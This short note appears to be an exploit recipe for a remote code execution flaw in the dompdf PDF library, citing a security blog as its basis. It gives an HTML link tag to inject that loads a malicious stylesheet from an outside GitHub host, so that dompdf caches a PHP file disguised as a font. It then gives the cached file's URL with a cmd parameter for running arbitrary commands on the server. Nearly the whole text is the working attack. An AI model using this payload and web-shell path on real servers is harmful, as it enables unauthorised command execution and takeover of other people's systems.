inject this html tag to the pdf generator and it will access the exploit font that will then get caches and we can access it from the webserver
<link rel=stylesheet href="https://raw.githubusercontent.com/sneaky-wizard/dompdf_rce/main/exploit.css" />

to access the cached font and execute any command you want
[baseurl]/dompdf/lib/fonts/exploitfont_normal_4cbdc86ff75b10ac55846884a529e2f9.php?cmd=[command]



based on https://positive.security/blog/dompdf-rce
